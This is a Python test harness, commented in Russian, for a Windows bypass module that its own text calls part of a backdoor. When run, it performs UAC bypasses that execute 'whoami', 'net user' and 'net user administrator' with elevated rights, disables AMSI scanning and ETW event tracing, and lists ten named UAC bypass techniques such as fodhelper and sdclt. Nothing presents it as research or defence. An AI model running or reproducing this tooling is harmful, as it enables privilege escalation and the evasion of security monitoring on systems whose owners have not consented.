#!/usr/bin/env python3
"""
Тестовый скрипт для проверки Windows Bypass функциональности.
"""

import platform
import sys
from windows_bypass import WindowsBypass, test_windows_bypass

def test_bypass_methods():
    """Тестирует различные методы bypass."""
    print("🧪 ТЕСТИРОВАНИЕ WINDOWS BYPASS МЕТОДОВ")
    print("=" * 50)
    
    if platform.system() != "Windows":
        print("❌ Этот тест предназначен только для Windows")
        return
    
    bypass = WindowsBypass()
    
    print(f"📊 Информация о системе:")
    print(f"  ОС: {platform.system()} {platform.release()}")
    print(f"  Версия: {bypass.windows_version}")
    print(f"  Администратор: {bypass.is_admin}")
    
    print(f"\n🛡️ Тестирование UAC Bypass:")
    test_commands = [
        "echo UAC bypass test successful",
        "whoami",
        "net user",
        "dir C:\\Windows\\System32"
    ]
    
    for cmd in test_commands:
        print(f"\n  Команда: {cmd}")
        result = bypass.bypass_uac(cmd)
        print(f"    Успех: {result['success']}")
        print(f"    Метод: {result['method']}")
        if result['error']:
            print(f"    Ошибка: {result['error']}")
    
    print(f"\n🔒 Тестирование AMSI Bypass:")
    amsi_result = bypass.bypass_amsi()
    print(f"  Успех: {amsi_result['success']}")
    print(f"  Метод: {amsi_result['method']}")
    if amsi_result['error']:
        print(f"  Ошибка: {amsi_result['error']}")
    
    print(f"\n📊 Тестирование ETW Bypass:")
    etw_result = bypass.bypass_etw()
    print(f"  Успех: {etw_result['success']}")
    print(f"  Метод: {etw_result['method']}")
    if etw_result['error']:
        print(f"  Ошибка: {etw_result['error']}")
    
    print(f"\n🎯 Тестирование Elevated Command:")
    elevated_result = bypass.execute_command_elevated("net user administrator")
    print(f"  Успех: {elevated_result['success']}")
    print(f"  Метод: {elevated_result['bypass_method']}")
    if elevated_result['output']:
        print(f"  Вывод: {elevated_result['output'][:100]}...")
    if elevated_result['error']:
        print(f"  Ошибка: {elevated_result['error']}")
    
    print(f"\n✅ Тестирование завершено")

def test_integration():
    """Тестирует интеграцию с основным бэкдором."""
    print("\n🔗 ТЕСТИРОВАНИЕ ИНТЕГРАЦИИ")
    print("=" * 30)
    
    try:
        from windows_bypass import apply_windows_bypasses, bypass_uac_command
        
        print("📦 Тестирование apply_windows_bypasses:")
        results = apply_windows_bypasses()
        print(f"  Общий успех: {results.get('overall_success', False)}")
        print(f"  UAC: {results.get('uac', {}).get('success', False)}")
        print(f"  AMSI: {results.get('amsi', {}).get('success', False)}")
        print(f"  ETW: {results.get('etw', {}).get('success', False)}")
        
        print("\n📦 Тестирование bypass_uac_command:")
        cmd_result = bypass_uac_command("echo Integration test")
        print(f"  Успех: {cmd_result['success']}")
        print(f"  Метод: {cmd_result.get('bypass_method', 'Неизвестно')}")
        
        print("\n✅ Интеграция работает корректно")
        
    except ImportError as e:
        print(f"❌ Ошибка импорта: {e}")
    except Exception as e:
        print(f"❌ Ошибка интеграции: {e}")

def test_security():
    """Тестирует безопасность bypass методов."""
    print("\n🔒 ТЕСТИРОВАНИЕ БЕЗОПАСНОСТИ")
    print("=" * 30)
    
    bypass = WindowsBypass()
    
    # Тестируем различные методы UAC bypass
    methods = [
        "fodhelper", "computerdefaults", "slui", "sdclt", 
        "changepk", "wsreset", "ms-settings", "registry_auto_run",
        "task_scheduler", "wmic"
    ]
    
    print("🛡️ Доступные методы UAC bypass:")
    for method in methods:
        print(f"  - {method}")
    
    print(f"\n🔍 Проверка прав администратора:")
    print(f"  Текущий пользователь: {bypass.is_admin}")
    
    if bypass.is_admin:
        print("  ⚠️ Уже запущен с правами администратора")
    else:
        print("  ✅ Запущен с обычными правами")
    
    print("\n✅ Тестирование безопасности завершено")

def main():
    """Основная функция тестирования."""
    print("🚀 ЗАПУСК ТЕСТОВ WINDOWS BYPASS")
    print("=" * 50)
    
    # Проверяем платформу
    if platform.system() != "Windows":
        print("❌ Этот модуль предназначен только для Windows")
        print("💡 Для тестирования на других платформах используйте другие модули")
        return
    
    try:
        # Тестируем базовые функции
        test_windows_bypass()
        
        # Тестируем методы bypass
        test_bypass_methods()
        
        # Тестируем интеграцию
        test_integration()
        
        # Тестируем безопасность
        test_security()
        
        print("\n🎉 ВСЕ ТЕСТЫ ЗАВЕРШЕНЫ УСПЕШНО!")
        
    except Exception as e:
        print(f"\n❌ Ошибка во время тестирования: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
